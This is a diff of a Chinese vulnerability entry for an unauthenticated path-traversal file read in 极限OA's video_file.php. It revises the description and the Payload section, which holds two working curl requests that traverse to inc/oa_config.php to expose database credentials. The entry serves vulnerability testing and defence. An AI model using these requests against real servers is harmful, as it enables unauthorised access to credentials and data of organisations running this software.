@@ -11,7 +11,9 @@ fingerprint: ["极限OA"]
 
 ## 漏洞描述
 
-极限OA 的 video_file.php 文件存在路径穿越导致的任意文件读取漏洞，攻击者无需认证即可通过 MEDIA_DIR 参数的目录穿越读取服务器上的任意文件，获取 OA 配置中的数据库凭据等敏感信息。
+极限OA 的 `video_file.php` 文件存在路径穿越导致的任意文件读取漏洞，攻击者无需认证即可通过 `MEDIA_DIR` / `MEDIA_NAME` 参数的目录穿越读取服务器上的任意文件，获取 OA 配置中的数据库凭据等敏感信息。
+
+> 极限OA 与通达OA 同源代码体系，因此 `video_file.php` 的路径与参数名一致；但两者配置文件不同：极限OA 为 `inc/oa_config.php`（含 `ROOT_PATH`、数据库连接信息），通达OA 为 `inc/td_config.php`（`td_` = TongDa）。请在目标产品上使用对应的文件名探测。
 
 ## 影响版本
 
@@ -31,11 +33,11 @@ fingerprint: ["极限OA"]
 ## Payload
 
 ```bash
-# 读取 OA 配置文件
+# 读取 OA 配置文件（极限OA 为 oa_config.php）
 curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
 
-# 读取其他配置
-curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=td_config.php"
+# 等价的 MEDIA_DIR 内联穿越写法
+curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=&MEDIA_NAME=../../../inc/oa_config.php"
 ```
 
 ## 验证方法
